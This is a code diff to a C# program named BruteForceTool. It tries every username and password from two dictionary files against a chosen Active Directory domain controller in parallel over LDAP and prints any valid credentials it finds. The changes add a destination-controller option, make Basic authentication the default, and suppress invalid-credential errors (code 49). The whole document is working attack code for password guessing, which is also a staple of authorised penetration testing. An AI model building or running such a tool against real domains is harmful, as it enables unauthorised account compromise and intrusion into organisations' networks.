@@ -20,8 +20,11 @@ namespace BruteForceTool
                 Console.WriteLine("Command line arguments are invalid");
                 return;
             }
-            var domain = options.Domain.Split('.').First();
             var authType = GetAuthType(options.AuthTypeInput);
+            var destinationDc = options.DestinationDc;
+            var domain = destinationDc.Substring(destinationDc.IndexOf('.') + 1);
+            if (authType == AuthType.Basic)
+                domain = domain.Split('.').First();
             try
             {
                 var usersDictionary = File.ReadAllText(options.UsersListPath)
@@ -32,7 +35,7 @@ namespace BruteForceTool
                 {
                     Parallel.ForEach(passwordDictionary, (pass) =>
                     {
-                        if (ValidateCredentials(user, pass, domain, authType))
+                        if (ValidateCredentials(user ,pass ,domain ,authType ,destinationDc ))
                         {
                             Console.WriteLine($"Found valid credentials for: {user}, Password: {pass}");
                         }
@@ -46,20 +49,20 @@ namespace BruteForceTool
         }
         internal class Options
         {
+            [Option('a', "authentication", Required = true,
+              HelpText = "Specify the authentication protocol")]
+            public string AuthTypeInput { get; set; }
+            [Option('d', "destination", Required = true,
+              HelpText = "Specify the destination domain controller")]
+            public string DestinationDc { get; set; }
             [Option('u', "users", Required = true,
               HelpText = "Specify users dictionary's path.")]
             public string UsersListPath { get; set; }
             [Option('p', "pass", Required = true,
               HelpText = "Specify passwords dictionary's path.")]
             public string PasswordListPath { get; set; }
-            [Option('d', "domain", Required = true,
-              HelpText = "Specify the domain name")]
-            public string Domain { get; set; }
-            [Option('a', "authentication", Required = true,
-              HelpText = "Specify the authentication protocol")]
-            public string AuthTypeInput { get; set; }
         }
-        public static string FirstCharToUpper(string input)
+        private static string FirstCharToUpper(string input)
         {
             if (IsNullOrEmpty(input))
                 throw new ArgumentException("Empty String input");
@@ -70,25 +73,27 @@ namespace BruteForceTool
             AuthType authType;
             if (!Enum.TryParse(FirstCharToUpper(authTypeInput.ToLower()), out authType))
             {
-                authType = AuthType.Kerberos;
+                authType = AuthType.Basic;
             }
             return authType;
         }
-        private static bool ValidateCredentials(string username, string password,string domain, AuthType authType)
+        private static bool ValidateCredentials(string username, string password,string domain, AuthType authType, string destinationDc)
         {
             var credentials
                 = new NetworkCredential(username, password, domain);
-            var id = new LdapDirectoryIdentifier(domain);
-            using (var connection = new LdapConnection(id, credentials, authType))
+            using (var connection = new LdapConnection($"{destinationDc}"))
             {
+                connection.AuthType = authType;
                 connection.SessionOptions.Sealing = true;
                 connection.SessionOptions.Signing = true;
                 try
                 {
-                    connection.Bind();
+                    connection.Bind(credentials);
                 }
-                catch (LdapException)
+                catch (LdapException bindException)
                 {
+                    if(bindException.ErrorCode != 49)
+                        Console.WriteLine(bindException);
                     return false;
                 }
                 return true;
